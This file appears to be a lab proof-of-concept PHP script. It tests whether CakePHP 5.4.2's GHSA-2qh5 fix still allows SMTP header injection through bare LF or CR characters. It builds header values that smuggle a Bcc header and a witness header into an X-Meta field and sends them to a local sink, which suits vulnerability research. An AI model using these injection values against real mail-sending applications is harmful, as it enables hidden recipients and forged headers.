<?php
declare(strict_types=1);

/**
 * Send one CakePHP 5.4.2 message through SmtpTransport to the lab SMTP sink.
 *
 * Cases: crlf (GHSA-2qh5 control), lf (leftover), cr (leftover pair-only strip).
 */

require __DIR__ . '/vendor/autoload.php';

use Cake\Mailer\Message;
use Cake\Mailer\Transport\SmtpTransport;

const WITNESS = 'CAKEPHP-SMTP-CRLF-WITNESS';
const BCC_ADDR = 'lab@localhost.invalid';

/**
 * @return array{label: string, meta: string}
 */
function payload_for(string $case): array
{
    return match ($case) {
        'crlf' => [
            'label' => 'crlf',
            'meta' => "ok\r\nBcc: " . BCC_ADDR . "\r\nX-Oracle: " . WITNESS,
        ],
        'lf' => [
            'label' => 'lf',
            'meta' => "ok\nBcc: " . BCC_ADDR . "\nX-Oracle: " . WITNESS,
        ],
        'cr' => [
            'label' => 'cr',
            'meta' => "ok\rBcc: " . BCC_ADDR . "\rX-Oracle: " . WITNESS,
        ],
        default => throw new InvalidArgumentException('case must be crlf, lf, or cr'),
    };
}

/**
 * Same callback GHSA-2qh5 added on SmtpTransport and MailTransport.
 */
function pair_only_strip(string $val): string
{
    return str_replace("\r\n", '', $val);
}

function cake_version(): string
{
    $path = __DIR__ . '/vendor/cakephp/cakephp/VERSION.txt';
    if (!is_file($path)) {
        return 'missing';
    }
    $lines = file($path, FILE_IGNORE_NEW_LINES);
    if ($lines === false) {
        return 'unreadable';
    }
    $nonempty = array_values(array_filter($lines, static fn(string $line): bool => $line !== ''));
    return $nonempty === [] ? 'empty' : (string)end($nonempty);
}

$case = $argv[1] ?? 'lf';
$payload = payload_for($case);

$host = getenv('SMTP_HOST') ?: 'smtp';
$port = (int)(getenv('SMTP_PORT') ?: '2525');

$message = new Message();
$message->setFrom('noreply@localhost.invalid', 'Lab');
$message->setTo('user@localhost.invalid', 'User');
$message->setSubject('lab-header-injection');
$message->setMessageId('<lab-smtp-crlf@localhost.invalid>');
$message->setHeaders(['X-Meta' => $payload['meta']]);
$message->setBodyText('body');

$smtpInclude = [
    'from',
    'sender',
    'replyTo',
    'readReceipt',
    'to',
    'cc',
    'subject',
    'returnPath',
];
$mailInclude = [
    'from',
    'sender',
    'replyTo',
    'readReceipt',
    'returnPath',
    'cc',
    'bcc',
];

$smtpHeaders = $message->getHeadersString($smtpInclude, "\r\n", pair_only_strip(...));
$mailHeaders = $message->getHeadersString($mailInclude, "\r\n", pair_only_strip(...));

$transport = new SmtpTransport([
    'host' => $host,
    'port' => $port,
    'timeout' => 15,
    'client' => 'lab.local',
]);
$sent = $transport->send($message);

$out = [
    'case' => $payload['label'],
    'cakephp' => cake_version(),
    'smtp_host' => $host,
    'smtp_port' => $port,
    'smtp_headers' => $sent['headers'] ?? '',
    'getHeadersString_smtp' => $smtpHeaders,
    'getHeadersString_mail' => $mailHeaders,
];

echo json_encode($out, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . "\n";
